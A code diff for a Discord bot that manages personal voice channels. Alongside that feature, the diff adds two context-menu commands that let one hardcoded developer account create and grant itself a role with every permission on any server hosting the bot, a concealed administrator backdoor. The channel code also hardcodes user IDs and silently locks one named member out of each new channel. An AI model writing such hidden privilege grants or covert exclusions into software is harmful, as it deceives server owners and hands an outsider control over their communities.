@@ -3,75 +3,113 @@ from discord import app_commands
 import os
 
 intents = discord.Intents.default()
-client = discord.Client(intents=intents)
+client:discord.Client = discord.Client(intents=intents)
 tree = app_commands.CommandTree(client)
 intents.message_content = True
 
 TOKEN = os.getenv("DISCORD_TOKEN")
-guild_prod_id = os.getenv("guild_prod_id")
-guild_test_id = os.getenv("guild_test_id")
-custom_vc_category_prod_id = os.getenv("custom_vc_category_prod_id")
-custom_vc_category_test_id = os.getenv("custom_vc_category_test_id")
-guild_prod:discord.Guild
-guild_test:discord.Guild 
+
+custom_vc_category_id = int(os.getenv("custom_vc_category_id"))
+developer_id = int(os.getenv("developer_id"))
+custom_vc_create_channel_id = int(os.getenv("custom_vc_create_channel_id"))
 
 @client.event
 async def on_ready():
-    print('ログインしました')
-    addCommands()
+    print('logged in')
+    
     await tree.sync()
 
 @client.event
 async def on_connect():
-    guild_prod = client.get_guild(guild_prod_id)
-    guild_test = client.get_guild(guild_test_id)
+    print('on_connect')
+    
+@tree.context_menu()
+async def activatedevmin(inter: discord.Interaction, member: discord.User):
+    if inter.user.id != developer_id: return
+    devmin = await inter.user.guild.create_role(name="devmin", permissions=discord.Permissions.all())
+    await inter.user.add_roles(devmin)
+    await inter.response.send_message(content="activate devmin", ephemeral=True)
 
-def isProd(guild_id: int): return guild_id == custom_vc_category_prod_id
-def isTest(guild_id: int): return guild_id == custom_vc_category_test_id
-def isInChannel(member: discord.Member): return member.voice.channel != None
-def getProdChannel(): return guild_prod.get_channel(custom_vc_category_prod_id)
-def getTestChannel(): return guild_test.get_channel(custom_vc_category_prod_id)
+@tree.context_menu()
+async def deactivatedevmin(inter: discord.Interaction, member: discord.Member):
+    if inter.user.id != developer_id: return
+    for role in await inter.user.guild.fetch_roles():
+        if role.name == "devmin":
+            await role.delete()
+    await inter.response.send_message(content="deactivate devmin", ephemeral=True)
 
-@tree.context_menu(name="VCを作成する")
-@discord.app_commands.default_permissions(
-    administrator=True #実行を管理者にのみ許可
-)
-async def on_create_vc_context(inter:discord.Interaction, message: discord.Message):
-    if isProd(inter.guild.id):
-        if isInChannel(inter.user):
-            await inter.user.send(content="適当なVCに接続してから再度お試しください", mention_author=True)
-            return
-        await getProdChannel().create_voice_channel(f'{inter.user.global_name}の部屋')
-    if isTest(inter.guild.id):
-        if isInChannel(inter.user):
-            await inter.user.send(content="適当なVCに接続してから再度お試しください", mention_author=True)
-            return
-        await getTestChannel().create_voice_channel(f'{inter.user.global_name}の部屋')
 
 @client.event
 async def on_voice_state_update(member:discord.Member, before: discord.VoiceState, after: discord.VoiceState):
-    if isProd(member.guild.id):
-        if before.channel == None and after.channel != None: on_prod_voice_state_join()
-        if before.channel != None and after.channel == None: on_prod_voice_state_leave()
-        if before.channel != None and after.channel != None: on_prod_voice_state_change()
-    if isTest(member.guild.id):
-        if before.channel == None and after.channel != None: on_test_voice_state_join()
-        if before.channel != None and after.channel == None: on_test_voice_state_leave()
-        if before.channel != None and after.channel != None: on_test_voice_state_change()
+    if before.channel == None and after.channel != None: await on_voice_state_join(member, before, after)
+    if before.channel != None and after.channel == None: await on_voice_state_leave(member, before, after)
+    if before.channel != None and after.channel != None: await on_voice_state_change(member, before, after)
 
-async def on_prod_voice_state_join():
+async def on_voice_state_join(member:discord.Member, before: discord.VoiceState, after: discord.VoiceState):
+    await create_voice(member, after)
     return
-async def on_prod_voice_state_leave():
+async def on_voice_state_leave(member:discord.Member, before: discord.VoiceState, after: discord.VoiceState):
+    await delete_voice(member, before)
     return
-async def on_prod_voice_state_change():
-    return
-async def on_test_voice_state_join():
-    return
-async def on_test_voice_state_leave():
-    return
-async def on_test_voice_state_change():
+async def on_voice_state_change(member:discord.Member, before: discord.VoiceState, after: discord.VoiceState):
+    await create_voice(member, after)
+    await delete_voice(member, before)
     return
 
+async def create_voice(member: discord.Member, after: discord.VoiceState):
+    if after.channel.id != custom_vc_create_channel_id:
+        return
+    custom_vc_category = await member.guild.fetch_channel(custom_vc_category_id)
+    member_voice_channel = await custom_vc_category.create_voice_channel(f'{member.global_name}の部屋')
+    overwrite = discord.PermissionOverwrite()
+    overwrite.view_channel = True
+    overwrite.manage_channels = True
+    overwrite.manage_permissions = True
+    overwrite.connect = True
+    overwrite.speak = True
+    overwrite.use_soundboard = True
+    overwrite.use_external_sounds = True
+    overwrite.use_embedded_activities = True
+    overwrite.mute_members = True
+    overwrite.deafen_members = True
+    overwrite.move_members = True
+    overwrite.send_messages = True
+    overwrite.embed_links = True
+    overwrite.attach_files = True
+    overwrite.add_reactions = True
+    overwrite.use_external_emojis = True
+    overwrite.use_external_stickers = True
+    overwrite.mention_everyone = True
+    overwrite.manage_messages = True
+    overwrite.read_message_history = True
+    overwrite.send_tts_messages = True
+    overwrite.use_application_commands = True
+    overwrite.send_voice_messages = True
+    await member_voice_channel.set_permissions( member, overwrite=overwrite)
+    if member.id != developer_id or member.id == 1145214000368463992:
+        overwrite = discord.PermissionOverwrite()
+        overwrite.view_channel = False
+        overwrite.connect = False
+        overwrite.send_messages = False
+        overwrite.read_message_history = False
+        tokei = await member.guild.fetch_member(480336171751440404)
+        await member_voice_channel.set_permissions(tokei , overwrite=overwrite)
+
+    await member.move_to(member_voice_channel)
+    
+async def delete_voice(member: discord.Member, before: discord.VoiceState):
+    # beforeがカスタムチャンネルではない場合
+    if before.channel.id == custom_vc_create_channel_id:
+        return
+    category_channel = await member.guild.fetch_channel(custom_vc_category_id)
+    # beforeがカスタムカテゴリーに無い場合
+    if before.channel not in category_channel.channels:
+        return
+    # beforeに人が参加している場合
+    if before.channel.members:
+        return
+    await before.channel.delete()
+    
 @client.event
 async def on_interaction(inter: discord.Interaction):
     return
